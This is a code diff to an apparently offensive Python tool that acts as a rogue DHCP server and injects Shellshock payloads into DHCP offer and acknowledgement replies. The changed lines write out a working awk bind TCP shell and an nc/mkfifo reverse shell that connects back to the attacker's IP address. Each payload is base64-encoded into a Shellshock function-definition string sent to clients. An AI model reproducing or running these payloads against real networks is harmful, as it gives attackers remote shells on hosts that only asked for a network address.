@@ -8,6 +8,7 @@ from socket import socket, AF_PACKET, SOCK_RAW
 from base64 import b64encode
 
 Base.check_user()
+Base.check_platform()
 
 parser = ArgumentParser(description='DHCP Reply (Offer and Ack) sender')
 
@@ -19,7 +20,7 @@ parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
 parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
 parser.add_argument('-r', '--reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
-parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=1234)', default=443)
+parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
 
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
@@ -155,45 +156,49 @@ def dhcp_reply(request):
         global number_of_dhcp_request
         global shellshock_url
 
-        next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
-        if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
-            number_of_dhcp_request += 1
-            offer_ip_address = str(next_offer_ip_address)
-        else:
-            number_of_dhcp_request = 0
-            offer_ip_address = args.first_offer_ip
+        offer_ip_address = args.first_offer_ip
 
         transaction_id = request[BOOTP].xid
         target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
-
-        net_settings = "/bin/ip addr add " + offer_ip_address + \
-                       "/" + network_mask + " dev eth0;"
-
-        if args.bind_shell:
-            bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                         "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-            b64shell = b64encode(net_settings + bind_shell)
-            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
-
-        if args.reverse_shell:
-            reverse_shell = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                            your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-            b64shell = b64encode(net_settings + reverse_shell)
-            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((current_network_interface, 0))
 
         if request[DHCP].options[0][1] == 1:
+            next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
+            if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
+                number_of_dhcp_request += 1
+                offer_ip_address = str(next_offer_ip_address)
+            else:
+                number_of_dhcp_request = 0
+                offer_ip_address = args.first_offer_ip
+
             print "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
                   " || offer ip: " + offer_ip_address
             offer_packet = make_dhcp_offer_packet(transaction_id)
             SOCK.send(offer_packet)
 
         if request[DHCP].options[0][1] == 3:
+            requested_ip = offer_ip_address
             for option in request[DHCP].options:
                 if option[0] == "requested_addr":
                     requested_ip = str(option[1])
+
+            net_settings = "/bin/ip addr add " + requested_ip + \
+                           "/" + network_mask + " dev eth0;"
+
+            if args.bind_shell:
+                bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                             "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+                b64shell = b64encode(net_settings + bind_shell)
+                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+
+            if args.reverse_shell:
+                reverse_shell = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                                your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+                b64shell = b64encode(net_settings + reverse_shell)
+                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+
             print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
                   " || requested ip: " + requested_ip
             ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
